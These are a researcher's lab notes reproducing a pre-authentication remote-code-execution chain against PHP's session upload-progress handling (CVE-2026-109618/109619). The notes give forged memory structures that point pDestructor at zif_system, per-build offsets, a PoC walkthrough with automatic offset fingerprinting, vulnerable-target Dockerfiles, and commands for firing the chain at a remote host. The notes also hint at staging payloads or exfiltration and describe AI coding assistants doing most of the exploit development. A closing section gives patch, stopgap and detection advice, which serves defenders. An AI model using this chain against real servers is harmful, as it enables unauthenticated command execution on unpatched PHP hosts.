# PHP2Shell — CVE‑2026‑109618 & CVE‑2026‑109619

### My lab notes: PHP internals, the exploit chain, PoC, and what actually worked

- **Credit:** I did not discover these vulnerabilities or invent the PHP2Shell technique. That credit belongs to the original researchers and the PHP security team. This is my attempt to reproduce and understand their work.
- **Scope:** Everything here was tested in my own local lab against publicly disclosed vulnerabilities. No third-party systems were involved.
- **Use responsibly:** These notes are for learning and authorized security research. Do not test systems you do not own or have permission to assess.
- **How I worked:** I used **Claude Code (Opus 4.8)** for much of the hands-on investigation and implementation, and **GPT‑6** to work through internals, interpret roadblocks, and help direct the research. I guided the process rather than writing the whole exploit myself.
- **Coming next:** I’ll publish a separate blog post explaining **how I reproduced PHP2Shell with Claude Code and GPT‑6**—including the dead ends, debugging sessions, prompts, and how I used both models together.
- **Reading these notes:** `[observed]` means something captured in the lab with GDB or HTTP; `[source]` comes from PHP’s C code; `[reconstructed]` means an explanation inferred from those two. Unless stated otherwise, offsets refer to x86‑64 LP64 builds of PHP 8.4/8.5.

**A little context:** This started as me trying to understand what the PHP bugs were actually doing internally. I then used Claude Code to run experiments and develop the reproduction, while I used GPT‑6 to unpack the internals and help me figure out what to ask next whenever the investigation got stuck. These are the technical notes; I’ll cover that whole process in the upcoming blog post.

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Common root cause](#2-common-root-cause)
3. [PHP internals you need (the building blocks)](#3-php-internals-you-need)
4. [Bug A — uninitialized HashTable bucket](#4-bug-a--uninitialized-hashtable-bucket)
5. [Bug B — dangling PS(id) session UAF + over‑read](#5-bug-b--dangling-psid-session-uaf)
6. [The exploit chain (leak → ASLR → fire)](#6-the-exploit-chain)
7. [Observed crashes & registers](#7-observed-crashes--registers)
8. [The PoC — full `remote_cve.py` walkthrough](#8-the-poc--full-remote_cvepy-walkthrough)
9. [Lab setup](#9-lab-setup)
10. [Running the PoC](#10-running-the-poc)
11. [Reproduction ledger & honest scope](#11-reproduction-ledger)
12. [Remediation & detection](#12-remediation--detection)
13. [Appendix: offsets, files](#13-appendix)

---

## 1. Executive summary

PHP2Shell is the name given to two memory-safety bugs disclosed in October 2026. Here is the quick picture:

| CVE                 | Mechanism                  | Primitive                                                                                                                              | File                    |
| ------------------- | -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| **CVE‑2026‑109618** | OOM / HashTable corruption | counted‑but‑uninitialized `HashTable` bucket when a `memory_limit` OOM interrupts a `$_POST` key allocation                            | `Zend/zend_hash.c`      |
| **CVE‑2026‑109619** | Stale global / session UAF | a mid‑upload OOM leaves the session‑id global `PS(id)` dangling into freed request heap, reused by the next request on the same worker | `ext/session/session.c` |

The interesting part is that the vulnerable processing can be reached **before authentication** through `multipart/form-data`. When the bugs are chained under the right conditions, the result is an information leak that defeats ASLR, followed by command execution as the web-server user.

- **CVSS 9.2.** Fixed **2026‑10‑21** in PHP **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35**; e.g. Ubuntu 26.04 `php8.5` in `8.5.4-0ubuntu1.5`.
- Every known trigger is `multipart/form-data`; `session.upload_progress` (default **On**) is the key feature.

> **A note on naming:** Some public write-ups attach the CVE numbers to different parts of the chain. To avoid confusion, I mainly refer to the bugs by what they actually do.

---

## 2. Common root cause

Here is the common thread. PHP expects request cleanup to happen in a particular order. If a fatal error interrupts processing midway—especially an OOM caused by `memory_limit`—`zend_bailout()` can jump over cleanup that would otherwise put things back into a valid state. That creates two problems:

1. **State updated before a fallible step stays half‑updated** (counter bumped before a failing alloc).
2. **Per‑request globals that should be nulled aren't**, and under a persistent SAPI (**Apache prefork + mod_php**, or a surviving PHP‑FPM worker) the _same process_ serves the next request → the stale pointers are live cross‑request.

Two details about the runtime made the lab behavior especially interesting:

- **ZendMM is cross‑request deterministic.** `shutdown_memory_manager(…, full=0)` zeroes the small‑bin free lists and resets the main chunk to `FIRST_PAGE`, **but keeps the 2 MB chunk mapped** — so every request re‑carves the same chunk from the same base in the same order, and freed bytes still read back their old content.
- **Apache prefork shares the parent's ASLR.** Workers are `fork()`ed from a master that loaded `libphp.so` once → **all workers share one layout**; a leaked pointer stays valid across workers, even after an OOM respawns a child.

```
Request A (producer)                 Request B (consumer, same worker)
─────────────────────                ─────────────────────────────────
… build session state …             php_hash_environment()   ← runs BEFORE session RINIT nulls PS(id)
OOM (memory_limit) ─► bailout        … reads/derefs the STALE PS(id) / stale bucket …
  cleanup SKIPPED                    ⇒ info leak (Bug B) or controlled call (Bug A/fire)
  PS(id) / bucket DANGLES
```

---

## 3. PHP internals you need

### 3.1 `zval` — 16 bytes

```
0x00  value        (8)  union: long/double/zend_string*/zend_array*/zend_object*/zend_reference*
0x08  u1.type_info (4)  (type) | (type_flags<<8)
0x0c  u2           (4)  next/cache/extra
```

Some important types: `IS_UNDEF=0 … IS_STRING=6 IS_ARRAY=7 IS_OBJECT=8 IS_REFERENCE=0x0a`. Bit `0x100` = **refcounted**. So `0x106`=counted string, `0x007`=array, `0x30a`=reference(+flags). `Z_REFCOUNTED_P(z)` is just `z->u1.type_info & 0x100` — **control +0x08 and you decide whether the engine dereferences `value`.**

### 3.2 `zend_refcounted_h` — 8 bytes

```
0x00 refcount(4)   0x04 u.type_info(4)  (GC_TYPE low byte, GC_FLAGS/INFO above)
```

`GC_DELREF(p)` = `--p->refcount`; at 0, `rc_dtor_func(p)` dispatches on `GC_TYPE`. **Control GC_TYPE ⇒ pick the destructor path.**

### 3.3 `zend_string`

```
0x00 gc(8)   0x08 h(8)   0x10 len  ← ZSTR_LEN   0x18 val[len+1]  ← ZSTR_VAL
```

Alloc = `24+L+1` bytes. **The leak controls `+0x10` (how far to over‑read) and reads `+0x18…` (the bytes).**

### 3.4 `HashTable`/`zend_array` — 56 bytes

```
0x00 gc    0x08 u.flags+nTableMask   0x10 arData(ptr)   0x18 nNumUsed+nNumOfElements
0x20 nTableSize+nInternalPointer     0x28 nNextFreeElement   0x30 pDestructor  ← gadget slot
```

Normal `$_POST` sub‑array: `pDestructor == zval_ptr_dtor` (real code pointer). Spray them → `zval_ptr_dtor` pointers everywhere (**leak oracle**). Forge one with `pDestructor = zif_system` → destroying it runs `system`. Note `arData`@+0x10 is a pointer — so a _live array_ landing on the dangling slot makes `ZSTR_LEN` huge → `php_url_encode` OOM (why the leak needs a **moderate** int at +0x10).

### 3.5 `Bucket` (32) / `zend_object`+handlers

```
Bucket:  0x00 val(zval,16)  0x10 h  0x18 key(zend_string*)
object:  0x00 gc  0x10 ce  0x18 handlers(ptr→table of fn ptrs)  0x20 props…
```

A refcounted zval with `GC_TYPE==IS_OBJECT` hitting 0 → `zend_objects_store_del` → **`obj->handlers->dtor_obj(obj)`** ⇒ control `handlers`→fake table and the body ⇒ control **RIP** (called ptr) + **RDI** (object).

### 3.6 ZendMM geometry **[source]**

```
≤3072B → small SLOT by BIN (free-list, usually NOT limit-checked)
>3072B → LARGE page run        (limit-CHECKED every call)   ← aim OOM here
CHUNK = 2 MiB aligned, 512×4KiB pages. BINS: 8,16,24,32,40,48,56,64,80,96,112,128,…
```

`free` pushes onto `heap->free_slot[bin]` writing only **offset 0** (the next link) → **bytes 8..size survive** (no poison in release). The `memory_limit` check lives only in `zend_mm_alloc_pages → zend_mm_safe_error → zend_error_noreturn(E_ERROR) → zend_bailout()`.

### 3.7 Bailout **[source]**

`zend_bailout()` → `longjmp(*EG(bailout), FAILURE)` back to the request‑level `zend_try{}`. No unwinding of intermediate frames → `MULTIPART_EVENT_END`, `zval_ptr_dtor(&progress->sid)`, nulling `PS(id)` all never run. The request still finishes via **normal shutdown**, which _does_ run `zend_array_destroy($_POST)` (how Bug A's bad bucket still gets visited).

---

## 4. Bug A — uninitialized HashTable bucket

### 4.1 Vulnerable insert **[source]**

```c
/* _zend_hash_str_add_or_update_i()  Zend/zend_hash.c — new string key */
idx = ht->nNumUsed++;                 /* (1) COUNTED first                       */
ht->nNumOfElements++;
p   = ht->arData + idx;
p->key = zend_string_init(str,len,0); /* (2) FALLIBLE large alloc (len>3072)     */
p->h   = h;                           /* (3) p->val written only AFTER (2)       */
ZVAL_COPY_VALUE(&p->val, pData);
```

If **(2)** fails, PHP bails out after counting the bucket but before finishing it. So `idx` is counted, `key` can still be `NULL`, and `val` has not been initialized.

### 4.2 Destroy walk (no guard) **[source]**

```c
/* zend_array_destroy → WITHOUT_HOLES + STATIC_KEYS fast loop */
do { i_zval_ptr_dtor(&p->val); } while (++p != end);   /* no IS_UNDEF check */

/* i_zval_ptr_dtor */
if (Z_REFCOUNTED_P(zv)) {                 /* (val.type_info & 0x100)            */
    zend_refcounted *r = Z_COUNTED_P(zv); /* r = val.value (8 attacker bytes)   */
    if (!GC_DELREF(r)) rc_dtor_func(r);   /* --r->refcount ; dispatch GC_TYPE   */
}
```

### 4.3 In memory **[observed, 8.2.3/8.5.11]**

Here is what GDB showed during the lab’s genuine OOM at the key allocation:

```
nNumUsed = nNumOfElements = 1865 ; arData[1864].key = 0x0 ; arData[1864].val = IS_UNDEF
```

When the storage happened to contain zeros, the value appeared as `IS_UNDEF` and cleanup did not dereference an invalid pointer. Other memory contents can change that outcome (see §7).

---

## 5. Bug B — dangling PS(id) session UAF

### 5.1 The session globals **[source, gdb‑confirmed]**

`ps_globals` (static): `zend_string *id; void *mod_data; php_session_rfc1867_progress *rfc1867_progress; zval http_session_vars; bool send_cookie; …` — `&ps_globals` at `0x…991fe0`, printable field‑by‑field in gdb.

### 5.2 Set session id from the body **[source]**

```c
/* FILE_START / FORMDATA in php_session_rfc1867_callback() */
if (name == PHPSESSID) { zval_ptr_dtor(&progress->sid); ZVAL_STRINGL(&progress->sid, val, len); }
…
php_rinit_session(0);
PS(id) = zend_string_copy(Z_STR(progress->sid));   /* PS(id) → heap slot O */
if (!Z_TYPE(progress->sid) || !progress->key.s) break;  /* bail if session fields come AFTER a file */
```

One detail that surprised me: this path can take the session ID from the multipart body without a normal session cookie or an explicit application-level `session_start()`. The ID still has to pass `php_session_valid_key()` (`[A-Za-z0-9,-]`).

### 5.3 The leak sink + latch **[source]**

```c
/* php_session_send_cookie() */
if (SG(headers_sent)) return FAILURE;                           /* fails once output started */
… php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id))) …          /* read VAL for LEN bytes     */

/* php_session_reset_id() */
if (PS(send_cookie)) {
    if (php_session_send_cookie()==FAILURE) return;            /* ← send_cookie STAYS 1 (latched) */
    PS(send_cookie)=0;
}
```

### 5.4 How the dangling pointer happened **[observed]**

```
multipart A:
  "PHPSESSID"="\x00"          → invalid → create_sid() → PS(send_cookie)=1
  "PHP_SESSION_UPLOAD_PROGRESS"
  1001 tiny fields            → >max_input_vars → E_WARNING → display_errors prints → headers_sent=1
  file "f"                    → FILE_START: PS(id)=copy(sid)  [bin-64 slot O]
                               reset_id→send_cookie(): headers_sent==1 → FAIL → send_cookie LATCHED=1
  "big"=12MB                  → large value read OOMs → bailout → END cleanup SKIPPED
⇒ PS(id)'s zend_string freed to bin-64 free list; ps_globals.id still → O; send_cookie still 1
```

```
[observed] req B @ php_hash_environment:
>>> HE#2 send_cookie=1  PS(id)=0x73ff0ea5b420 len=32 val=b'a92193291f82fce17eaabaed9707b724'   (8.5.11: dangling)
   on patched 8.5.12 the same groom → PS(id)=0x0   (fix nulls it)
```

### 5.5 How the over-read showed up **[observed]**

Request B refills slot `O` so `O+0x10 (ZSTR_LEN)=0x1000` and `O+0x18… (ZSTR_VAL)=heap`. Then `php_url_encode` emits 4096 B of live heap into `Set-Cookie: PHPSESSID=…`. What can set a **moderate** int at `O+0x10`:

| reclaims O                                          | O+0x10 becomes     | result                           |
| --------------------------------------------------- | ------------------ | -------------------------------- |
| fresh session id (zend_string)                      | its own len (=32)  | within‑slot, benign stale id     |
| live `zend_array`                                   | `arData` (pointer) | **huge** → url_encode OOM        |
| **rfc1867 temp value buffer (header‑less "forge")** | **our bytes**      | **moderate → clean over‑read** ✓ |

```
[observed] cookie began 4c 41 41 41 … = 'L'+'A's (the forge) then pointers 0x76663f2a70a0,…70c0,…70f0
           → 98 agree on chunk base 0x76663f200000
```

---

## 6. The exploit chain

Let `O` = chunk offset of the dangling `PS(id)` slot.

```
STAGE 0 rotate  OOM+init → child aborts → prefork forks a fresh worker with the SAME layout.

STAGE 1 chunk base
  producer: dangle PS(id)@O (bin-64) + latch send_cookie
  leaker  : [N=841 filler fields][forge "1999": bytes[0x10]=0x1000, [0x18]='L']
            forge's bin-64 temp buffer re-carves ONTO O → ZSTR_LEN(O)=0x1000
            cookie=4096B → chunk_base = mode(ptr & ~0x1FFFFF)

STAGE 2 libphp base
  leaker  : same, FLEN=0x40000, + K≤78 sub-arrays "gi[0]&gi[1]"
            each sub-array zend_array has +0x30 = zval_ptr_dtor (code ptr) → lands in window
            libphp_base = (repeated value, low12==off(zval_ptr_dtor)) − off(zval_ptr_dtor)

STAGE 3 fire
  producer: dangle a session pointer
  leaker  : [15× forged zend_array as field values][2× fake reference]
            one array lands at chunk+htdata; refs overwrite the dangling slot
            session destroy → zend_hash_destroy → pDestructor = zif_system → system(cmd)
```

### 6.1 The forged `zend_array` (167 B) **[reconstructed + observed to run]**

```
0x00 01 00 00 00 07 00 00 00   gc: refcount=1, IS_ARRAY
0x10 <htdata+0x20>             arData → fake bucket inside itself
0x18 01 00 00 00 01 00 00 00   nNumUsed=1, nNumOfElements=1
0x30 <zif_system>             pDestructor = zif_system   ← GADGET
0x80 01 00 00 00 06 01 00 00   embedded zval: IS_STRING|REFCOUNTED (0x106)
0x90 <len(cmd)> ; 0x98 "id>/out/p\0"   (cmd ≤ MAX_CMD=14)
```

### 6.2 The fake reference (55 B)

```
0x10 01 00 00 00 0a 00 00 00   refcount=1, IS_REFERENCE(0x0a)
0x18 <htdata>                  target → the forged zend_array
```

### 6.3 Trigger **[source+observed]**

`zend_hash_destroy(forged_ht)` → `forged_ht->pDestructor(&bucket.val)` = `zif_system(fake frame)` → `system("id>/out/p")`.

```
[observed, php:8.4.26-apache]
chunk=0x794352a00000 libphp=0x79435466c000 HTDATA=0x794352a690d8 ZIF=0x794354ad1370
proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 6.4 Where the 8.5.4 attempt stopped **[observed]**

The forged array **landed in memory** (`chunk+0x69498…`), but `zend_hash_destroy` was only reached for real `$_POST` arrays; the attempt never reached `zif_system`. The producer dangled `PS(id)="aaa"` (len 19, **bin‑48**) while the 55‑B ref is **bin‑56/80** → can't reclaim it; the exact 8.5.4 deref was not identified. **Bottom line for 8.5.4: the leak was verified, but the final stage was not successfully ported.**

---

## 7. Observed crashes & registers **[observed, 8.2.3, gdb]**

**Rung 2 — arbitrary‑ptr deref** (forged `val` 0x106‑shaped):

```
SIGSEGV zend_gc_delref (mov (%rax),%eax ; rax=0x106)
  ← i_zval_ptr_dtor(arData[1864]) ← zend_array_destroy($_POST) zend_hash.c:1773 ← php_request_shutdown
```

**Rung 2e‑A — RIP+RDI control** (fake object, `GC_TYPE=IS_OBJECT`, `handlers.dtor_obj=TARGET`):

```
i_zval_ptr_dtor → GC_DELREF(fakeobj 1→0) → rc_dtor_func → zend_objects_store_del → handlers->dtor_obj(obj)
SIGSEGV pc=0x424242424242  rdi=0x7ffff730da00 (fakeobj, fully controlled)
```

**Rung 2e‑B — system()** (stack pivot, ASLR off):

```
handlers.dtor_obj = jump_fcontext  (mov rdi,rsp ; jmp *r8)
  → RSP=fakeobj ; jmp r8=[fakeobj+0x38]=`pop rdi;ret` → pop [fakeobj+0x40]=&"id" → ret → system
proof: uid=0(root)
```

(That is the reason the two bugs are chained: the address leak addresses the ASLR limitation of a debugger-only, ASLR-disabled demonstration.)

---

## 8. The PoC — full `remote_cve.py` walkthrough

The PoC is written in Python using the standard library. It sends HTTP through raw sockets, so there is no extra Python package to install.

### 8.1 Constants & profiles

```python
SID = b"attacksessionid0001"      # the id used in leaker/fire requests
MAX_CMD = 14                       # forged zval string cap (cmd must fit at ht+0x98)

# per-build offsets (zif/dtor are code offsets; htdata/stage* are heap-layout facts)
BOOKWORM = dict(zif=0x465370, dtor=0x65eb60, htdata=0x690D8,
                stage1_n=841, stage2_t=406, stage2_v=16, pads=[(31,31)]*6, carrier=True)
LAB      = dict(..., stage1_n=892, stage2_t=443, stage2_v=1, pads=[(8,7)]+[(7,7)]*5, carrier=False)

OFFSET_DB = { ("8.4.26","debian"): {zif:0x465370, dtor:0x65eb60},   # fingerprint → offsets
              ("8.5.4","ubuntu"):  {zif:0x3dda90, dtor:0x5e8740} }
```

### 8.2 Request plumbing

- **`multipart(parts, boundary)`** — builds the body: each part is `--B\r\nContent-Disposition: form-data; name="…"[; filename="…"\r\nContent-Type: application/octet-stream]\r\n\r\n<data>\r\n`, terminated by `--B--\r\n`. Field **order** is significant (files‑vs‑fields ordering drives the dangle).
- **`Target.post(body, boundary, read_cap, …)`** — opens a raw TCP socket, writes a minimal `POST … HTTP/1.1` with `Content-Length` + `Connection: close`, sends head+body, reads up to `read_cap` (big for the leak, since the cookie can be ~4 KB–800 KB).

### 8.3 Offset acquisition (three ways)

- **`elf_symbols(path, wanted)`** — a dependency‑free ELF64 reader: parses section headers, walks `SHT_SYMTAB`/`SHT_DYNSYM`, returns `{name: value}`. Used by `--libphp` to read `zif_system`/`zval_ptr_dtor` from a copy of the module.
- **`http_head(url)` + `fingerprint(url)`** — GET `/`, parse `X-Powered-By: PHP/x.y.z` and `Server: … (Debian|Ubuntu)`, return `(phpver, os_family)`. Used by `--fingerprint` to key `OFFSET_DB` — **no target `.so` needed**.
- hardcoded `--profile`/`--zif`/`--dtor` as a last resort.

### 8.4 Leak parsers

- **`cookie_bytes(resp)`** — regex `Set-Cookie: PHPSESSID=([^\r\n]*?); path=/`, URL‑decode → raw leaked bytes.
- **`chunk_base(raw)`** — `Counter` of `(v & ~0x1FFFFF)` over every 8‑byte value in the userspace pointer range; returns the base with ≥8 hits (the 2 MB‑aligned cluster).
- **`libphp_base(raw, dtor)`** — reads a pointer `p` from the leak; if `p & 0xfff == dtor & 0xfff` (page offsets match), returns `p - dtor`. (My `leak_full.php` variant ranks candidates by hit‑count to beat noise.)

### 8.5 The `Exploit` class — the four moves

- **`rotate()`** — an OOM request (1001 fields + file + 12 MB) then a session‑init request; forces a fresh worker with the same layout.
- **`stage1()`** — producer dangles `PS(id)`; leaker sends `stage1_n` 48‑byte fillers then the **forge** (`"1999"`, 79 B, `pack("<Q",0x1000)` at +0x10, `'L'` at +0x18). Returns `chunk_base(cookie)`.
- **`stage2()`** — leaker sprays `$_POST` sub‑arrays (one index gets 16 elements) so `zval_ptr_dtor` pDestructors fill the over‑read window. Returns `libphp_base(cookie, dtor)`.
- **`fake(htdata, zif)`** — builds the 167‑B forged `zend_array` (pDestructor=`zif`, cmd at +0x98) and the 55‑B fake reference (→`htdata`).
- **`stage3(htdata, zif)`** — producer dangles a session pointer; leaker sprays 15× the forged array (as field values) + 2× the reference (overwrite). On session destroy → `system(cmd)`.

### 8.6 How `main()` ties everything together

```
offsets:  --libphp  (read from a .so)   |  --fingerprint (headers→OFFSET_DB)  |  --profile/--zif/--dtor
htdata:   --htdata <fixed>              |  --htdata-sweep lo:hi:step          |  --auto-htdata (self-locate)
loop:     --attempts N (fixed htdata)   |  sweep/auto loops stop on --proof-file
```

- **`--auto-htdata`** _(added)_ — leak the bases **once** (stable across prefork workers), then fire‑sweep a built‑in range off the leaked chunk base, stopping when the proof file appears → **no window needed**.
- **`--fingerprint`** _(added)_ — pick `zif`/`dtor` from `OFFSET_DB` by the HTTP‑header build id → **no `libphp.so` needed**.
- `proof_ok()` checks whether the proof file is non-empty. That was the script’s success signal, although the file should also be checked to ensure it came from the current run.

---

## 9. Lab setup

### 9.1 Target A — the lab where RCE worked (Debian bookworm, `php:8.4.26-apache`)

`bw-ctx/php.ini`:

```ini
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M
session.save_path = "/tmp"
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

`bw-ctx/apache.conf` (single worker so the chain leaks+fires in one child):

```apache
KeepAlive Off
<IfModule mpm_prefork_module>
  StartServers 1
  MinSpareServers 1
  MaxSpareServers 1
  MaxRequestWorkers 1
  ServerLimit 1
  MaxConnectionsPerChild 0
</IfModule>
```

`Dockerfile.bw-target`:

```dockerfile
FROM php:8.4.26-apache
COPY php.ini     /usr/local/etc/php/conf.d/zz-php2shell.ini
COPY apache.conf /etc/apache2/conf-enabled/zz-php2shell.conf
COPY index.php   /var/www/html/index.php            # <?php echo "OK\n";
RUN apt-get update && apt-get install -y --no-install-recommends python3 gdb binutils \
 && rm -rf /var/lib/apt/lists/* && mkdir -p /out && chown -R www-data:www-data /out
```

Build & run:

```bash
docker build -t local/php-lab:bw-target bw-ctx/
docker run -d --name bwlab --cap-add=SYS_PTRACE --security-opt seccomp=unconfined local/php-lab:bw-target
docker cp remote_cve.py bwlab:/root/remote_cve.py
```

### 9.2 Target B — where I verified the leak (Ubuntu 26.04, vulnerable `php8.5=8.5.4-0ubuntu1`)

`Dockerfile.u2604-php854-vuln`:

```dockerfile
FROM ubuntu:26.04
ENV DEBIAN_FRONTEND=noninteractive
# Pin php8.5* to the VULNERABLE release build 8.5.4-0ubuntu1 (the fix is 0ubuntu1.5)
RUN printf 'Package: php8.5* libapache2-mod-php8.5*\nPin: version 8.5.4-0ubuntu1\nPin-Priority: 1001\n' \
      > /etc/apt/preferences.d/99-php-pin \
 && apt-get update \
 && apt-get install -y --no-install-recommends --allow-downgrades \
      apache2 libapache2-mod-php8.5 php8.5-cli php8.5-common gdb ca-certificates curl less procps \
 && php8.5 -v && rm -rf /var/lib/apt/lists/*
# Apache: prefork + mod_php, single persistent worker (deterministic cross-request groom)
RUN a2dismod mpm_event mpm_worker 2>/dev/null || true; a2enmod mpm_prefork php8.5; \
    printf 'ServerName localhost\n<IfModule mpm_prefork_module>\n StartServers 1\n MinSpareServers 1\n MaxSpareServers 1\n MaxRequestWorkers 1\n MaxConnectionsPerChild 0\n</IfModule>\n' \
      > /etc/apache2/conf-available/single-worker.conf && a2enconf single-worker; \
    sed -ri 's!AllowOverride None!AllowOverride All!' /etc/apache2/apache2.conf
# PHP ini (Apache SAPI). output_buffering=Off is REQUIRED so the max_input_vars warning
# flushes in time to latch send_cookie.
RUN printf 'memory_limit = 8M\ndisplay_errors = On\ndisplay_startup_errors = On\nerror_reporting = E_ALL\nhtml_errors = On\noutput_buffering = Off\nimplicit_flush = On\npost_max_size = 64M\nupload_max_filesize = 64M\nsession.save_path = "/tmp"\nsession.use_strict_mode = 0\nsession.use_cookies = 1\nsession.upload_progress.enabled = On\nsession.upload_progress.cleanup = On\nmax_input_vars = 1000\nfile_uploads = On\nmax_file_uploads = 20000\n' \
      > /etc/php/8.5/apache2/conf.d/99-lab.ini
RUN printf '<?php echo "OK\\n";' > /var/www/html/index.php
EXPOSE 80
CMD ["sh","-c","rm -f /var/run/apache2/apache2.pid; exec apachectl -D FOREGROUND"]
```

Matching **debug symbols** (so gdb can read `ps_globals`, break on the session functions, and confirm the leaked offsets) — install the **same `0ubuntu1`** ddeb, not the current one:

```bash
# inside the running container
apt-get install -y gnupg; mkdir -p /etc/apt/keyrings
curl -fsSL "https://keyserver.ubuntu.com/pks/lookup?op=get&search=0xF2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622" \
  | gpg --dearmor -o /etc/apt/keyrings/ddebs.gpg
printf 'deb [signed-by=/etc/apt/keyrings/ddebs.gpg] http://ddebs.ubuntu.com resolute main universe\n' \
  > /etc/apt/sources.list.d/ddebs.list
apt-get update
apt-get install -y --allow-downgrades libapache2-mod-php8.5-dbgsym   # pin selects 8.5.4-0ubuntu1
# → gdb now resolves zif_system=0x3dda90, zval_ptr_dtor=0x5e8740, ps_globals=0x991fe0 (full DWARF)
```

Build, run, verify the leak against ground truth:

```bash
docker build -t local/php-lab:u2604-php854-vuln .
docker run -d --name u2604lab --cap-add=SYS_PTRACE --security-opt seccomp=unconfined local/php-lab:u2604-php854-vuln
docker cp leak_full.php u2604lab:/root/leak_full.php
docker exec u2604lab php8.5 /root/leak_full.php 841 78 0 0x40000
# → chunk_base=0x76663f200000  libphp_base=0x76663de00000  zif_system=0x76663e1dda90
#   verified EXACT against /proc/<worker>/maps and gdb runtime symbols
```

---

## 10. Running the PoC

**Automated lab run** — the script handles offset selection:

```bash
docker exec bwlab python3 /root/remote_cve.py \
    -u http://127.0.0.1:80/index.php \
    --fingerprint --auto-htdata \
    --cmd 'id>/out/p' --proof-file /out/p
docker exec bwlab cat /out/p        # uid=33(www-data) …
```

**Offsets from the binary**, fixed htdata:

```bash
--libphp /usr/lib/apache2/modules/libphp.so --profile bookworm
```

**Offsets by hand** (last resort): `--zif 0x465370 --dtor 0x65eb60 --htdata 0x690d8`.
**From another host** (truly remote): map the port (`docker run … -p 8088:80`), then on the attacker box

```bash
python3 remote_cve.py -u http://TARGET:8088/index.php --fingerprint --auto-htdata --cmd 'id>/out/p' --proof-file <shared>/p
```

(The command is ≤14 B; in a real engagement it stages a bigger payload / exfil instead of a local proof file.)

**Troubleshooting**

- _Leak returns `none`_ → latch not armed: ensure `display_errors=On` **and `output_buffering=Off`**; one worker only (`MaxRequestWorkers 1`).
- _Leak ok, no proof_ → `htdata` off: use `--auto-htdata` (or widen `--auto-range lo:hi:step`).
- _Wrong `uid`/nothing_ → offsets don't match the build: confirm `--fingerprint` read the right version, or point `--libphp` at the exact module.

---

## 11. Reproduction ledger

| Build                        | Leak                                            | Fire                              | Proof                                                          |
| ---------------------------- | ----------------------------------------------- | --------------------------------- | -------------------------------------------------------------- |
| PHP 8.2.3 (debug)            | n/a (ASLR off)                                  | **RCE**                           | `uid=0(root)` via object‑handlers → `jump_fcontext` → `system` |
| PHP 8.5.4‑0ubuntu1 (mod_php) | **verified** (gdb‑exact; bases == `/proc/maps`) | places, trigger un‑ported         | `zif_system=0x76663e1dda90` leaked == runtime                  |
| PHP 8.4.26‑apache            | **verified**                                    | **RCE**, reproducible, fully auto | `uid=33(www-data)`                                             |

**Still not demonstrated:** the final execution stage on 8.5.4 (only the leak was verified), or the same behavior on patched PHP versions. I don’t want to blur that distinction.

---

## 12. Remediation & detection

**The actual fix:** upgrade to PHP **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35** or the distro backport (Ubuntu `8.5.4-0ubuntu1.5`).
**Stopgaps:** `session.upload_progress.enabled=0` (FPM); `memory_limit=-1` (removes OOM trigger, adds DoS risk); strip `multipart/form-data` at the edge (breaks uploads).
**Detection:** multipart → `memory_limit` errors / repeated 500s; oversized or non‑hex `PHPSESSID` **response** cookies; worker churn; `PHP Request Startup: … in Unknown on line 0`; session files containing `upload_progress_` next to `<?php`.

---

## 13. Appendix

**Offsets**

| Build                   | `zif_system` | `zval_ptr_dtor` | `htdata`   | `stage1_n` |
| ----------------------- | ------------ | --------------- | ---------- | ---------- |
| `php:8.4.26-apache`     | `0x465370`   | `0x65eb60`      | `0x690d8`  | 841        |
| Ubuntu `8.5.4-0ubuntu1` | `0x3dda90`   | `0x5e8740`      | `~0x69498` | 841        |

**Lab files**

- `remote_cve.py` — the full chain (leak → ASLR → fire), with `--libphp` / `--fingerprint` / `--auto-htdata`.
- `leak_full.php` — standalone leak (chunk+libphp), the 8.5.4‑verified reproduction.
- `fire.php` — 8.5.4 fire port (places; trigger un‑ported).
- `Dockerfile.bw-target` + `bw-ctx/` — the full‑RCE target.
- `Dockerfile.u2604-php854-vuln` — the leak‑verified real target.

_These are notes from an authorized local-lab reproduction of publicly disclosed PHP vulnerabilities, not a claim to have discovered PHP2Shell. Full credit for the original discoveries and techniques goes to their researchers and the PHP security team. I used Claude Code (Opus 4.8) and GPT‑6 throughout the process, and **I’ll publish a separate blog post about how I reproduced PHP2Shell with Claude and GPT‑6**, including what worked, what failed, and how I directed the investigation._
